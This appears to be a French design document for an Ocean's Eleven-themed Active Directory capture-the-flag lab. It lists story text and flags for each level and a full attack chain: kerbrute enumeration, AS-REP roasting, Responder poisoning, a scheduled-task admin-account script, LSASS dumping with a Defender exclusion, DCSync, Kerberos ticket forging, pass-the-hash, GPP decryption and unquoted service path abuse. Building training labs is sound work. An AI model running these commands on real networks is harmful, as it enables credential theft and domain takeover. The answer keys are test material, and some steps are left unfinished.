
Ocean's Eleven

theme song: https://youtu.be/sdSai09_jzc
theme write: https://www.youtube.com/watch?v=FteCteGhnYY

mindmap ORANGE : https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg

Infra:
- 3 forêts (Bellagio, The Mirage, MGM Grand)
- Domaines enfants (Bellagio: casino.bellagio.com Mirage: casino.mirage.com MGM Grand: casino.mgmgrand.com )
- Pour les groupes dans les AD : Croupiers ( la ou un des equipiers est dedans (pas de droit) )  Sécurité casinon basique (Peu de droit) Sécurité vidéo (autre droit) sécurité des coffres ( beaucoup de droit mais pas admin admin) et le compte créateur de Terry Beneditct

=================================================================================

=================================================================================

Domaines et Unités d'Organisation (OU)

Domaines Enfants
    Bellagio: casino.bellagio.com
    Mirage: casino.mirage.com
    MGM Grand: casino.mgmgrand.com

Unités d'Organisation (OU)
=================================================================================

MGM Grand

  OU=Management <br/>
      PC: ManagementPC-MGM <br/>
      Utilisateurs: Benedict, Manager1-MGM, Manager2-MGM <br/>

  OU=VIP <br/>
      PC: VIPPC-MGM <br/>
      Utilisateurs: VIPManager-MGM, VIPAssistant-MGM <br/>

  OU=Sécurité <br/>
      PC: SecurityPC-MGM <br/>
      Utilisateurs: SecurityChief-MGM, SecurityGuard1-MGM, SecurityGuard2-MGM <br/>

  OU=IT <br/>
      PC: ITServer-MGM, ITPC-MGM <br/>
      Utilisateurs: ITAdmin-MGM, ITSupport1-MGM, ITSupport2-MGM <br/>

  OU=Croupier <br/>
      PC: CroupierPC-MGM <br/>
      Utilisateurs: Croupier1-MGM, Croupier2-MGM <br/>

**********************************************************************************************************************************************


Mirage

  OU=Management <br/>
      PC: ManagementPC-Mirage <br/>
      Utilisateurs: Benedict, Manager1-Mirage, Manager2-Mirage <br/>

  OU=VIP <br/>
      PC: VIPPC-Mirage <br/>
      Utilisateurs: VIPManager-Mirage, VIPAssistant-Mirage <br/>

  OU=Sécurité <br/>
      PC: SecurityPC-Mirage <br/>
      Utilisateurs: SecurityChief-Mirage, SecurityGuard1-Mirage, SecurityGuard2-Mirage <br/>

  OU=IT <br/>
      PC: ITServer-Mirage, ITPC-Mirage <br/>
      Utilisateurs: ITAdmin-Mirage, ITSupport1-Mirage, ITSupport2-Mirage <br/>

  OU=Croupier <br/>
      PC: CroupierPC-Mirage <br/>
      Utilisateurs: Croupier1-Mirage, Croupier2-Mirage <br/>

**********************************************************************************************************************************************

Bellagio

  OU=Management <br/>
      PC: ManagementPC-Bellagio <br/>
      Utilisateurs: Benedict, Manager1-Bellagio, Manager2-Bellagio <br/>

  OU=VIP <br/>
      PC: VIPPC-Bellagio <br/>
      Utilisateurs: VIPManager-Bellagio, VIPAssistant-Bellagio <br/>

  OU=Sécurité <br/>
      PC: SecurityPC-Bellagio <br/>
      Utilisateurs: SecurityChief-Bellagio, SecurityGuard1-Bellagio, SecurityGuard2-Bellagio <br/>

  OU=IT <br/>
      PC: ITServer-Bellagio, ITPC-Bellagio <br/>
      Utilisateurs: ITAdmin-Bellagio, ITSupport1-Bellagio, ITSupport2-Bellagio <br/>

  OU=Croupier <br/>
      PC: CroupierPC-Bellagio <br/>
      Utilisateurs: Croupier1-Bellagio, Croupier2-Bellagio <br/>

**********************************************************************************************************************************************


Groupes AD

File Share Managers
    Description : Groupe contenant les employés responsables de la gestion des partages de fichiers.
    Membres : FileShareAdmin-Bellagio, FileShareAdmin-Mirage, FileShareAdmin-MGM

  CEO <br/>
      Description: Compte administrateur de Terry Benedict. <br/>
      Membres: Benedict <br/>



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 1 (Reconnaissance NMAP) (AD Bellagio)  :


Script pour histoire du niveau :

"Reconnaissance" 1 "Votre équipe s'infiltre dans le casino, pour que le casse commence vous devez pénétrer leur environnement informatique.<br>Votre mission consiste à identifier les types de serveurs présents sur leur réseau ainsi que les ports ouverts.<br><br>L’équipe a réussi à soudoyer un membre du service IT lors des missions de reconnaissances, obtenant ainsi une plage d’adresses IP 10.X.0.0/24<br><br>Vous allez pouvoir cartographier le réseau du casino et identifier les services exposés.<br><br>Entrer le ttl suivi de la version du serveur." "1282019" 100

Attaque : 

lancer un nmap pour que la personne connaissent son réseaux qui répondent 

```powershell

nmap -Pn -p- -sV -sC 10.1.1.1/24

nxc smb "10.1.1.1"
```


Key ctf = 1282019


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Level 2 Trouver les user (AD Bellagio) :

Script pour histoire du niveau :

"Enumération" 2 "Après avoir cartographié l’infrastructure du casino, vous vous retrouvez face à un nouveau défi : pénétrer le cœur du serveur pour dénicher les identifiants des employés et des comptes de services.<br><br>Pour progresser, il vous faut dresser une liste des comptes AD susceptibles d’être utilisés dans l’environnement du casino.<br><br><br>Un de vos contacts au sein du service IT a réussi à récupérer un fichier brut : une liste d’environ 1 000 noms d’utilisateurs utilisés pour le support interne. Vous <a href="/users.txt" target="_blank">téléchargez ce fichier</a> puis l’analysez pour en extraire les comptes potentiellement valides.<br><br>Entrer le nom de l'utilisateur." "svc-bella" 200

Attaque : 

Avoir une liste de user pour réaliser un bruteforce sur les username. Pour cela, on peut fournir une liste d'user à l'utilisateur qui peut telechagrer depuis le site web avec 1000 username afin de bruteforce et on met par exemple 5 username valides.

```powershell

kerbrute userenum --dc "10.1.1.1" -d "bellagio.local" users.txt

```

FLAG : svc-bella

Mettre dans list_recup.txt les noms recuperes

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 3 prendre controle d'un compte sans permission (ASREP-Roasting) (AD Bellagio)  :

Script pour histoire du niveau :

 "Usurpation de compte sans permission" 3 "Terry Benedicte sous-estime une faille cruciale dans son système de sécurité informatique. Les comptes de service de son réseau n'ont pas l'air d'avoir de pré-authentification requise.<br><br>Votre objectif est de récupérer le hashs des mots de passe de l'utilisateur précédemment trouvé pour permettre de récuperer ces comptes et de prendre le contrôle d'un compte pour qu'un de vos coéquipiers puissent se faire passer pour cette personne là et devier les systèmes de sécurité du Bellagio.<br><br>Entrer le mot de passe trouvé." "P@ssw0rd" 300 


Attaque : 

=> L'attaque consiste à recuperer le hash d'un password. Cette technique exploite le fait que si un utilisateur n'a pas de pré-authentification requise (ce qui est le cas par défaut pour les comptes de service), le serveur Kerberos renverra le TGT chiffré avec le mot de passe de l'utilisateur sans vérifier le mot de passe au préalable.

```powershell
GetNPUsers.py -request -outputfile "hashes.txt" -format "john" -usersfile "users_list.txt" -dc-ip "10.1.1.1" "bellagio.local/"

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Flag (à soumettre) : P@ssw0rd



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Level 4 (AD Bellagio) : Attaque via le lien de confiance et empoisonnement SMB/LLMNR

Script pour histoire du niveau :

send_request "Hash bruteforce" 4 "Grâce au compte trouvé, tu peux donc effectuer une recherche pour connaitre le ou les différents lien de confiance qui sont liés a ce serveur.<br><br>Avec toutes ces informations tu peux ensuite t'interesser au partage de fichier. Votre équipe a besoin de vous car elle est bloqué sans ce mot de passe ils ne pourront pas passer les portiques de sécurité qui va permettre a l'équipe de pouvoir se déplacer librement entre le Bellagio et le MGM Grand <br><br>Entre le mot de passe bruteforcé." "Administrator123" 300


Attaque : 
```powershell

ldapsearch -H ldap://10.1.1.1 -D "bellagio\svc-bella" -W -x -b "DC=bellagio,DC=local" >> ldapsearch.txt

```

```powershell

smbmap -H "10.1.1.1" -d bellagio.local -u 'svc-bella' -p 'P@ssw0rd'

```

Lire le fichier de log et le pentester ce rend compte que toutes les 5min un utilisateur se connecte et execute un script toutes les 5 minutes (taches planifiées) 

```powershell
smbclient //10.1.1.1/script -U 'bellagio\svc-bella%P@ssw0rd'

get 111_script_smb.ps1

```

Modifier le nom de domaine dans le fichier du script 111_script_smb.ps1

Lancer responder qui empoisonnera les réponses LLMNR Netbios et qui récupèrent le hash du compte. 

```powershell

responder -I wg0

```


Flag : Administrator123


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 5 (AD Mgm Grand) : Escalade de privilèges via une tache planifié

Script pour histoire du niveau :


send_request "Coulisses du MGM" 5 "Danny Ocean te remercie, grace à toi toutes l'équipe du braquage va pouvoir se déplacer entre les 2 casinos.<br><br>Mais l’équipe a découvert que le système protégeant le coffre-fort se renouvelait toutes les cinq minutes. De plus, pour y accéder, il faut posséder un certain niveau de privilège afin de récupérer le mot de passe le protégeant, lequel est stocké dans le bureau du système de sécurité .<br><br>."2bgpad-butrt" 500


Attaque :

L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés

Exemple de script : 

```shell
    evil-winrm -i IP_X.X.X.X -u "$USER" -p "$PASSWOR"
```

```shell
    rm 
```


```powershell
$username = "NomUtilisateur"

$password = "MotDePasse123!"

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

New-LocalUser -Name $username -Password $securePassword -FullName "Nom Complet" -Description "Utilisateur admin créé via script"

Add-LocalGroupMember -Group "Administrators" -Member $username

Write-Host "Utilisateur $username créé et ajouté au groupe Administrators."

```

FLAG : 2bgpad-butrt



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 6 (AD MGM grand) : Dump mémoire LSAAS


Script pour histoire du niveau :

send_request "Mémoire Volatile" 6 "Danny Ocean et le reste de l’équipe se trouvent désormais dans la chambre forte du MGM Grand. <br><br>Votre mission est de les faire ressortir de cet endroit avec un maximum d’argent. Pour cela, il vous faudra réaliser un dump de la mémoire des comptes du MGM Grand afin d’obtenir les informations nécessaires pour ouvrir le plus de coffres possibles.<br><br>." "DannyOcean" 600


Attaque : 

La première étape consiste donc à se connecter sur la machine cliente cible 

```shell
    evil-winrm -i IP_X.X.X.X -u "$USER" -p "$PASSWOR"
```
L'attaquant doit ensuite checker les utilisateurs qui sont actuellement connectés sur la machine cible

```shell
    to complete
```

Ayant obtenu des droits admin Local à l'étape précédente il peut maintenant installer des applications et les lancer.
On va donc installer l'outil procdump fourni par microsoft afin d'extraire le contenu du LSASS de la mémoire.

Commande pour installer procdump
```shell
    invoke-webrequest https://download.sysinternals.com/files/Procdump.zip -OutFile "your_output"

 Expand-Archive -path "C:/Users/Toto/Documents/Proc.zip" -Destinationpath "C:/Users/Toto/Documents/Proc"

```

ensuite l'extraire 
```Powershell
    tocomplete
```

puis l'installer en tant que debogger par défaut pour qu'il se lance sans problème même à travers une connexion distante et accepter les conditions d'utilisation.


```Powershell
    Add-MpPreference -ExclusionPath "C:/Users/lala/Downloads/"
```

```Powershell
    .\procdump.exe -accepteula -i
```

après l'installation il reste un problème de taille : l'ANTI VIRUS qui detecte l'extraction du LSASS dans un fichier .dmp et le supprime en emettant l'alerte "Trojan:Win32/LsassDump.B" pour éviter cela nous allons exclure le dossier où va être sauvegarder le fichier .dmp, c'est à dire empecher l'antivirus de scanner ce dossier .

La commande est la suivante : 
```Powershell
    Add-MpPreference -ExclusionPath "C:/Users/lala/Downloads/"
```
Ensuite nous allons procéder à l'extraction du LSASS.

```Powershell
    .\procdump.exe lsass.exe -ma "C:/Users/lala/Downloads/"
```
Grâce à notre session Evil-Winrm on va pouvoir télécharger sur notre machine attaquante le fichier .dmp

```Powershell
    download "C:/Users/lala/Downloads/lsass.exe_250605_024441.dmp"
```
Nous avons donc le contenu du LSASS sur notre machine attaquante on va donc extraire le contenu.
La commande pour extraire le contenu du LSASS (.dmp) et l'afficher dans un format JSON est la suivante :

```shell
    pypykatz lsa minidump "your_lsass_file.dmp" --json
```

FLAG : 




--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Level 7:  DCSYNC 

Script pour histoire du niveau :

 send_request "Miroir du Domaine" 7 "Danny Ocean et le reste de l’équipe se trouvent désormais dans la chambre forte du MGM Grand. <br><br>Votre mission est de les faire ressortir de cet endroit avec un maximum d’argent. Pour cela, il vous faudra réaliser un dump de la mémoire des comptes du MGM Grand afin d’obtenir les informations nécessaires pour ouvrir le plus de coffres possibles.<br><br>." "DannyOcean" 700

Vous avez désormais les privilèges de Domain Admin sur le domaine MGM Grand. Avec ce niveau d’accès, vous êtes à deux doigts de contrôler totalement l’infrastructure Active Directory. Cependant, pour finaliser votre emprise, il vous faut centraliser tous les secrets du domaine : mots de passe de chaque utilisateur, comptes de services, et le hash du compte krbtg...

Votre mission pour ce niveau consiste à simuler un contrôleur de domaine afin d’interroger directement l’AD. En exécutant DCSYNC depuis une machine compromise, vous ne déclencherez pas les journaux classiques d’un dump direct de la base AD, car c’est l’API Domain Replication (RPC) qui vous fournira copie des attributs sensibles (ntHash, LMHash, etc.) en tant que « réplicateur ».

Attaque : 

Grâce à l’étape précédente, vous possédez le hash NTLM ou le mot de passe d'un nouvel utilisateur (ou le ticket Kerberos ) qui possède les droits de faire DSYNC (l'attaquant doit vérifier lui même les droits de ce nouveau compte). 

pour réaliser l'attaque depuis Exegol : 
```shell 
    secretsdump -outputfile 'something' 'rome.local'/'toto':'toto2022'@'10.10.10.168'
```

```shell 
    secretsdump -outputfile 'something' '$DOMAIN'/'$USER':'$PASSWORD'@'$SERVER_IP'
```

Exemple de resultat du DSYNC 

ci dessous les hash NTLM
```shell
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:d6f22bdacd93357020c9ecc5eb0fd329:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:eec1c91cba5e46ef9be464376bd12e60:::
    rome.local\lala:1104:aad3b435b51404eeaad3b435b51404ee:32086bb2f6715b39ab8e88183f758cab:::
    rome.local\fifi:1107:aad3b435b51404eeaad3b435b51404ee:d7abfd2645b8206c886d736fd0664f41:::
    rome.local\toto:1108:aad3b435b51404eeaad3b435b51404ee:114f9f67317a0247ab51bb87641979ce:::
    rome.local\titi:1109:aad3b435b51404eeaad3b435b51404ee:36afe8d8d2ce73ce31f8a38c981f4040:::
    ATHENA$:1000:aad3b435b51404eeaad3b435b51404ee:4766d5a0b03c27dc13ee68a3773a9176:::
    NIAGARA$:1103:aad3b435b51404eeaad3b435b51404ee:63f2b6a853f146053b9968af62fb8fe1:::
    ANUNAKIN$:1105:aad3b435b51404eeaad3b435b51404ee:652c1be004ef335aa218cfed8e9297fc:::
    OLYMPE$:1106:aad3b435b51404eeaad3b435b51404ee:652c1be004ef335aa218cfed8e9297fc:::
```

ci dessous les clés Kerberos
``` shell
    [*] Kerberos keys grabbed
    Administrator:aes256-cts-hmac-sha1-96:633c7562bd5ba07fe8c4c1377e425b7f2321b888d1062a3eea6faa56c699bdb8
    Administrator:aes128-cts-hmac-sha1-96:43698b1518eb55fcd7589b8f81e7f4f1
    Administrator:des-cbc-md5:e9d057b3514a45cd
    krbtgt:aes256-cts-hmac-sha1-96:0c953f3998ed392024b3e65d24b3d4aeb590689237a2749f4dd7c4b517d05925
    krbtgt:aes128-cts-hmac-sha1-96:f78229642decf24f04e4187946409a20
    krbtgt:des-cbc-md5:2c944c7a23e319b6
    rome.local\lala:aes256-cts-hmac-sha1-96:e3c4636f8804812a284a56e77008a3997e889af2feb04f7c74cd2ad73d73ed34
    rome.local\lala:aes128-cts-hmac-sha1-96:cc9e681caf16aa6088b9628ab4a558e5
    rome.local\lala:des-cbc-md5:737552a76ecd5131

```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 8: Fabrication ticket Kerberos 


Après avoir extrait le hash NTLM du compte krbtgt du domaine mgm.local lors du niveau 7, l’équipe d’Ocean détient désormais la clé ultime pour manipuler Kerberos à sa guise. En effet, le compte krbtgt est utilisé par le Key Distribution Center (KDC) pour chiffrer et signer les tickets Kerberos ; posséder son hash équivaut à pouvoir fabriquer de toutes pièces un TGT (Ticket Granting Ticket) valide pour n’importe quel utilisateur du domaine. Vous êtes donc prêts à forger un Golden Ticket, qui vous ouvrira instantanément les droits de n’importe quel compte (en particulier un compte “Domain Admin”) sur tout l’AD MGM Grand, sans jamais alerter les journaux de connexion standard.

Votre mission pour ce niveau consiste à utiliser l’outil Mimikatz (ou Rubeus, selon votre préférence) pour générer un TGT factice et l’injecter dans votre session. Grâce à ce Golden Ticket, vous pourrez ensuite accéder à n’importe quel serveur du domaine MGM, extraire des secrets, créer des comptes persistants ou simplement naviguer librement dans l’infrastructure AD. Vous êtes extrêmement proches de la compromission totale de l’AD MGM Grand.

La commande suivante permet de générer un ticket kerberos à partir de cette clé aeskey 

```shell
    getTGT.py -aesKey X.X.X.X.X.XXXXX $DOMAIN/$USER
```
Exemple :

```shell
    getTGT.py -aesKey 1d746375979dc78aa5e51dd5c814a439758e36fbaa4d56473be698d7a53847d2 mgmgrand.local/administrator
```
Le ticket Kerberos généré à partir de la clé du compte $USER sera enregistrer dans un fichier $USER.ccache.

La prochaine étape consiste à exporter le ticket généré dans notre environnement afin de pouvoir l'utiliser facilement

```shell
    export KRB5CCNAME=./administrator.ccache 
```

Verification


```shell
    klist
```
OutPut
```shell
    ./Administrator.ccache
```

Avant de pouvoir se connecter à l'AD cible il faut l'ajouter à la liste des hosts sur la machine attaquante (pas le docker)
```shell
    cat /etc/host

    ·
    127.0.0.1       exegol-ad                                                                                                                                       │·················································
    10.8.2.1        mgmgrand.local                                                                                                                                  │·················································
    10.8.2.1        WINDOWS-R5KU10Q.mgmgrand.local  WINDOWS-R5KU10Q

cat /etc/resolv.conf

nameserver 10.8.2.1 

```

Maintenant on peut se connecter avec winrm sur l'AD en tant qu'Administrator grâce au ticket qu'on a généré.

```shell
     evil-winrm -i WINDOWS-R5KU10Q.mgmgrand.local -u administrator -r mgmgrand.local 
```


Note : on peut aussi se connecter via WMI directement en faisant un PASS THE HASH avec le hash ntlm
```shell
    wmiexec.py ROME.LOCAL/Administrator@10.10.10.168 -hashes :d6f22bdacd93357020c9ecc5eb0fd329
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 9 (AD Mirage) : Enumeration de users sur le port 445

!!! Fournir liste users.txt et password.txt !!!

La commande permet de lister les utilisateurs possible avec le password. Pour cela, on utilise l'outil nxc qui realiser cette attaque sur le port 445.
Pour cela, le pentester aura en sa possession, une wordlist de USER et de PASSWORD.

```shell
nxc smb 10.1.3.1 -u users.txt -p passwords.txt -t 16

SMB         10.1.3.1        445    WINDOWS-7HBD3FQ  [+] mirage.local\FrankCatton:P@ssw0rd 
```

Grace à cela il trouve un utilisateur valide. Il peut désormais se connecter au paratge SMB du AD "mirage.local" et s'y intéresser....


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 10 (AD Mirage) : Exploitation des mots de passe GPP (Group Policy Preferences)


Le pentester peut lister les repertoires sur le partage SMB avec ses credentials.

L'outil utilisé est smbmap.
```shell
smbmap -H "10.1.3.1" -d mirage.local -u 'FrankCatton' -p 'P@ssw0rd'

│·················································
[+] IP: 10.1.3.1:445    Name: 10.1.3.1                  Status: Authenticated                                                                                   │·················································
        Disk                                                    Permissions     Comment                                                                         │·················································
        ----                                                    -----------     -------                                                                         │·················································
        ADMIN$                                                  NO ACCESS       Remote Admin                                                                    │·················································
        C$                                                      NO ACCESS       Default share                                                                   │·················································
        IPC$                                                    READ ONLY       Remote IPC                                                                      │·················································
        NETLOGON                                                READ ONLY       Logon server share                                                              │·················································
        SYSVOL                                                  READ ONLY       Logon server share

```
                                                                                                                                                                
Aucun repertoire semble interessant au premier abord. Cependant, le dossier SYSVOl, s'il est mal configuré, il peut representer une faille de sécurité.
Le pentester n'a que ce chemin pour le moment pour essayer de obtenir des privileges plus élevés.
Il va donc lister et s'interesser au dossier SYSVOL du domaine.

```shell
smbclient //10.X.X.X.X/SYSVOL -U 'mirage/FrankCatton%P@ssw0rd'

cd mirage.local\Policies\{12345678-1234-1234-1234-123456789ABC}\Machine\Preferences\Groups\ 

ls
│·················································
  .                                   D        0  Thu Jun  5 15:36:29 2025                                                                                      │·················································
  ..                                  D        0  Thu Jun  5 15:36:29 2025                                                                                      │·················································
  Groups.xml                          A      531  Thu Jun  5 15:36:29 2025                                                                                      │·················································


get Groups.xml 

exit

gpp-decrypt.py -f Groups.xml

[ * ] Username: svc-backup                                                                                                                                      │·················································
[ * ] Password: GPPstillStandingStrong2k18   

```
Il peut desormais se connecter au PC-CLIENT du domaine avec ce compte local

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 11 (AD Mirage) : Escalade de privilèges vi un chemin sans quotes

Script pour histoire du niveau :

Après avoir consolidé votre accès sur dans le casino Bellagio, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Grace a votre compte de service récupéré sur cet AD, et des reconaissances suplémentaires, vous pouvez désormais vous connecter à un PC via un service de controle à distance.

Maintenant, analysez bien ce qu'il y a sur l'ordinateur, et exploiter y une faille ....


Attaque Unquoted Service Path : 

L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés



Commandes :

Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*"'} | Select-Object Name, DisplayName, PathName
=> Liste les services sans quote.

icacls "C:\Chemin\Vers\Le\Dossier"
=> Verifie les permission

# Créer un script malveillant
$maliciousScript = @'
$path = "$env:USERPROFILE\Desktop\exploit.txt"
New-Item -ItemType File -Path $path -Force
Set-Content -Path $path -Value "Ce fichier a été créé via une exploitation de service non sécurisé."
'@

Set-Content -Path "C:\Program.exe" -Value $maliciousScript

Copier le script malveillant dans le répertoire cible
Copy-Item "C:\Program.exe" -Destination "C:\Program Files\Some Folder\Program.exe"

Redémarrer le service vulnérable
Restart-Service -Name "VulnerableService"

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 12 (AD Mirage) A trouver :
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



